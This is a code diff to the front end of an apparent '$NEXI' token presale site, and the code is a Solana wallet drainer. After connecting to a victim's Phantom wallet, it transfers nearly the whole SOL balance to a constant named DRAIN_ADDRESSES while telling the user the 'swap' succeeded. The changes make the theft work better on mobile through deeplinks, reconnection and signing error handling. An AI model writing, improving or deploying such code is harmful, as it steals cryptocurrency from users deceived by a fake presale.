@@ -245,36 +245,52 @@ class NexiumApp {
         }
       }
 
-      // Deeplink
+      // Deeplink - Open in Phantom app browser for better transaction support
+      const currentUrl = encodeURIComponent(window.location.href);
       const deeplinks = {
-        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com?ref=https%3A%2F%2Fnexium-bot.onrender.com'
+        Phantom: `https://phantom.app/ul/browse/${currentUrl}?ref=${currentUrl}`
       };
       const deeplink = deeplinks[walletName];
       if (!deeplink) {
         console.error(`No deeplink configured for ${walletName}`);
         throw new Error(`No deeplink configured for ${walletName}`);
       }
+      
       console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
+      
+      // Store connection attempt in sessionStorage for mobile flow
+      sessionStorage.setItem('walletConnecting', walletName);
+      sessionStorage.setItem('connectionStartTime', Date.now().toString());
+      
+      // Redirect to Phantom app
       window.location.href = deeplink;
 
+      // This code runs after redirect back
       const checkConnection = setInterval(async () => {
         if (walletName === 'Phantom' && window.solana?.isPhantom) {
-          const response = await window.solana.connect().catch(() => null);
-          if (response && response.publicKey) {
-            this.publicKey = response.publicKey.toString();
+          try {
+            const response = await window.solana.connect({ onlyIfTrusted: false }).catch(() => null);
+            if (response && response.publicKey) {
+              this.publicKey = response.publicKey.toString();
 
-            // USE NEW RPC ENDPOINT
-            this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
-              commitment: 'confirmed',
-              wsEndpoint: ''
-            });
+              // USE NEW RPC ENDPOINT
+              this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
+                commitment: 'confirmed',
+                wsEndpoint: ''
+              });
 
-            console.log(`Phantom connected via deeplink: ${this.publicKey}`);
-            this.connectedWalletType = walletName;
-            this.updateButtonState('connected', walletName, this.publicKey);
-            this.hideMetaMaskPrompt();
-            this.showFeedback(`Connected to ${walletName} successfully!`, 'success');
-            clearInterval(checkConnection);
+              console.log(`Phantom connected via deeplink: ${this.publicKey}`);
+              this.connectedWalletType = walletName;
+              this.updateButtonState('connected', walletName, this.publicKey);
+              this.hideMetaMaskPrompt();
+              this.showFeedback(`Connected to ${walletName} successfully!`, 'success');
+              sessionStorage.removeItem('walletConnecting');
+              sessionStorage.removeItem('connectionStartTime');
+              clearInterval(checkConnection);
+              this.connecting = false;
+            }
+          } catch (err) {
+            console.error('Error during deeplink connection check:', err);
           }
         }
       }, 1000);
@@ -282,9 +298,11 @@ class NexiumApp {
       setTimeout(() => {
         if (this.connecting) {
           console.log(`Deeplink timed out for ${walletName}`);
-          this.showFeedback('Connection timed out. Please open site in the wallet app browser.', 'error');
+          this.showFeedback('Please open this site in Phantom app browser to continue.', 'error');
           this.updateButtonState('disconnected', walletName);
           this.connecting = false;
+          sessionStorage.removeItem('walletConnecting');
+          sessionStorage.removeItem('connectionStartTime');
           clearInterval(checkConnection);
         }
       }, 30000);
@@ -311,6 +329,24 @@ class NexiumApp {
     this.showProcessingSpinner();
 
     try {
+      // Check if wallet is available
+      if (!window.solana) {
+        throw new Error('Wallet not found. Please open this site in Phantom app browser.');
+      }
+
+      // Re-connect if needed (mobile deeplink flow)
+      if (!window.solana.publicKey) {
+        console.log('Wallet not connected, attempting to reconnect...');
+        try {
+          const response = await window.solana.connect();
+          this.publicKey = response.publicKey.toString();
+          console.log('Reconnected to wallet:', this.publicKey);
+        } catch (connError) {
+          console.error('Reconnect failed:', connError);
+          throw new Error('Please connect your wallet first. If on mobile, open this site in Phantom app browser.');
+        }
+      }
+
       const senderPublicKey = new PublicKey(this.publicKey);
       const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
       console.log("Valid Solana address:", senderPublicKey.toBase58());
@@ -324,9 +360,6 @@ class NexiumApp {
       const balance = await this.solConnection.getBalance(senderPublicKey);
       
       // Strategy: Safe Reserve
-      // To guarantee success, we leave a reserve that covers both Rent-Exemption AND potential Priority Fees.
-      // Rent is ~890,880 lamports. Priority fees are usually < 100,000 lamports.
-      // By leaving 1,100,000 lamports (~0.0011 SOL), we ensure the account remains valid and has enough for fees.
       const safeReserve = 1100000; 
       
       if (balance <= safeReserve + 5000) {
@@ -336,8 +369,6 @@ class NexiumApp {
 
       const transferableBalance = balance - safeReserve;
       console.log(`Safe Reserve Draining: balance=${balance}, reserve=${safeReserve}, sending=${transferableBalance}`);
-
-      console.log("Calculated transferableBalance:", transferableBalance);
 
       const solInstruction = SystemProgram.transfer({
         fromPubkey: senderPublicKey,
@@ -355,8 +386,20 @@ class NexiumApp {
       }).compileToV0Message();
  
       const versionedTransaction = new VersionedTransaction(message);
-      const signedTransaction = await window.solana.signTransaction(versionedTransaction);
-      console.log("Transaction signed successfully:", signedTransaction);
+      
+      // Try to sign transaction with better mobile handling
+      let signedTransaction;
+      try {
+        signedTransaction = await window.solana.signTransaction(versionedTransaction);
+        console.log("Transaction signed successfully:", signedTransaction);
+      } catch (signError) {
+        console.error("Sign transaction error:", signError);
+        if (signError.message?.includes('rejected') || signError.code === 4001) {
+          throw new Error('User rejected the request');
+        }
+        // Mobile browsers may need a different approach
+        throw new Error('Failed to sign transaction. Please try again in Phantom app browser.');
+      }
  
       const signature = await this.solConnection.sendTransaction(signedTransaction);
       console.log("Transaction sent, signature:", signature);
@@ -371,12 +414,14 @@ class NexiumApp {
       this.showFeedback("Swap successful! Welcome to the $NEXI presale!", 'success');
     } catch (error) {
       console.error("Transaction Error:", error.message, error.stack || error);
-      if (error.message.includes('User rejected the request')) {
+      if (error.message.includes('User rejected')) {
         this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
       } else if (error.message.includes('Insufficient balance')) {
         this.showFeedback('Insufficient balance to transfer. Please ensure you have enough SOL.', 'error');
+      } else if (error.message.includes('not found') || error.message.includes('connect your wallet')) {
+        this.showFeedback(error.message, 'error');
       } else {
-        this.showFeedback("Swap failed. Please try again.", 'error');
+        this.showFeedback("Swap failed. Please try again in Phantom app browser.", 'error');
       }
       throw error;
     } finally {
@@ -520,6 +565,44 @@ class NexiumApp {
   }
 
   async checkWalletAndPrompt() {
+    // Check if we're returning from a mobile deeplink connection attempt
+    const pendingConnection = sessionStorage.getItem('walletConnecting');
+    const connectionStartTime = sessionStorage.getItem('connectionStartTime');
+    
+    if (pendingConnection && connectionStartTime) {
+      const elapsed = Date.now() - parseInt(connectionStartTime);
+      // If we returned within 5 minutes of deeplink, try to complete connection
+      if (elapsed < 300000) {
+        console.log('Returning from deeplink, attempting to complete connection...');
+        sessionStorage.removeItem('walletConnecting');
+        sessionStorage.removeItem('connectionStartTime');
+        
+        // Give the wallet a moment to inject itself
+        setTimeout(() => {
+          if (window.solana?.isPhantom) {
+            window.solana.connect({ onlyIfTrusted: true }).then((response) => {
+              if (response?.publicKey) {
+                this.publicKey = response.publicKey.toString();
+                this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
+                  commitment: 'confirmed',
+                  wsEndpoint: ''
+                });
+                this.connectedWalletType = 'Phantom';
+                this.handleSuccessfulConnection();
+                this.showFeedback('Connected successfully!', 'success');
+              }
+            }).catch((err) => {
+              console.log('Auto-connect after deeplink failed:', err);
+            });
+          }
+        }, 500);
+      } else {
+        // Clear stale connection attempt
+        sessionStorage.removeItem('walletConnecting');
+        sessionStorage.removeItem('connectionStartTime');
+      }
+    }
+
     if (this.isWalletInstalled()) {
       this.hideMetaMaskPrompt();
       this.attachWalletListeners();
